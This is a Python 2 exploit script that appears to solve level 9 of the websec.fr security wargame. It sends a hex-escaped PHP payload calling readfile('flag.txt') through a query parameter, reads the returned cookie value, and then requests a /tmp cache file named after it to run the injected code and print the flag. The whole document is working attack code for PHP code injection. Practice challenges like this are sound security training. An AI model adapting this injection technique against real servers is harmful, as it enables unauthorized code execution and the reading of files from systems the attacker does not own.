import urllib, urllib2
import requests

url = "http://websec.fr/level09/index.php?c=readfile%5Cx28%5Cx27flag.txt%5Cx27%5Cx29%5Cx3B&submit=Submit"
url_1 = "http://websec.fr/level09/index.php?cache_file=/tmp/"
cook = ""

def send_payload(URL):
	global cook
	req = urllib2.Request(URL)
	res = urllib2.urlopen(req)
	cookie = res.headers.get('Set-Cookie')
	cook = cookie.split("=")[1].split(";")[0]
	print("[-] Send to payload : {}".format(URL))
	print("[-] randval : {}".format(cook))

def Upload_file(URL, cookie):
	URL = URL + cookie
	res = requests.get(URL)
	print("[-] Exploit URL : {}".format(URL))
	print("[-] FLAG : {}".format(res.text.split(" ")[0].split("<")[0]))
	print("[+} Exploit Success!")

if __name__ == '__main__':
	print("[+] Start!")
	send_payload(url)
	Upload_file(url_1, cook)